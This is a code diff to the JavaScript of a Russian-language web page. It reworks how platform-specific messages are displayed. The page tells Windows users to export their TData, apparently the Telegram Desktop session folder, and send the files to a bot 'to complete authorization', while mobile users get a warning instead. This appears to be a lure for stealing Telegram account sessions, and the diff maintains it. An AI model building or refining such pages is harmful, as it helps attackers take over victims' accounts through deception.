@@ -145,6 +145,12 @@
             const mobileWarning = document.getElementById('mobileWarning');
             const successMessage = document.getElementById('successMessage');
             
+            // Скрываем все сообщения
+            instructions.style.display = 'none';
+            mobileWarning.style.display = 'none';
+            successMessage.style.display = 'none';
+            
+            // Показываем соответствующее сообщение
             if (platform === 'windows') {
                 instructions.innerHTML = `
                     <h3>Инструкция по экспорту TData:</h3>
@@ -157,12 +163,8 @@
                     <p>После экспорта TData, отправьте файлы боту для завершения авторизации.</p>
                 `;
                 instructions.style.display = 'block';
-                mobileWarning.style.display = 'none';
-                successMessage.style.display = 'none';
             } else {
-                instructions.style.display = 'none';
                 mobileWarning.style.display = 'block';
-                successMessage.style.display = 'none';
             }
         }
 
